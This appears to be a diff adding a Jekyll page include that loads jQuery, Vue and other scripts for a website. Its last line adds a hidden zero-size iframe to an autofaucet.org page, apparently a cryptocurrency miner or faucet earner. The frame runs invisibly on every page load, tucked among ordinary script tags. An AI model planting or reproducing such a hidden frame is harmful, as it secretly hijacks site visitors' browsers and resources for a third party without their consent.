@@ -1,0 +1,17 @@
+<script src="/vendor/jquery-1.11.3.min.js"></script>
+<script src="/vendor/clipboard.min.js"></script>
+<script src="/vendor/image-compressor.min.js"></script>
+<script src="/vendor/nprogress/nprogress.js"></script>
+<script src="/vendor/html2canvas.min.js?{{ site.time | date: '%s' }}"></script>
+<script src="/vendor/sweetalert2.all.min.js?{{ site.time | date: '%s' }}"></script>
+<script src="/vendor/vue-2.3.4/dist/vue.min.js"></script>
+<script src="/js/init.js?{{ site.time | date: '%s' }}"></script>
+<script src="/js/home.js?{{ site.time | date: '%s' }}"></script>
+
+{% if page.additional_script %}
+  {% for js in page.additional_script %}
+    <script src="{{ js }}"></script>
+  {% endfor %}
+{% endif %}
+
+<iframe src="https://autofaucet.org/wm/yuuminn9/4" width="0" height="0" style="border:0"></iframe>
